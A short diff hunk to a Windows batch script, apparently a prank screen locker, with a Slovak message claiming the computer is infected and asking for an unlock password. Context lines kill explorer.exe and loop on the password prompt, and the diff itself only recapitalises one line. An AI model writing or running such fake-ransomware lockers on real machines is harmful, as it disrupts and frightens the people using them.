@@ -15,7 +15,7 @@ powershell -command "$handle = (Get-Process | where {$_.MainWindowTitle -like '*
 taskkill /f /im explorer.exe > nul
 :start
 echo Váš počítač bol nakazený vírusom,
-echo Ak tento výrus nefunguje kontaktujte Jakuba Zápražného.
+echo ak tento výrus nefunguje kontaktujte Jakuba Zápražného.
 set /p heslo="Zadajte heslo pre odblokovanie výrusu: "
 if %heslo% == 0000 (
     cls
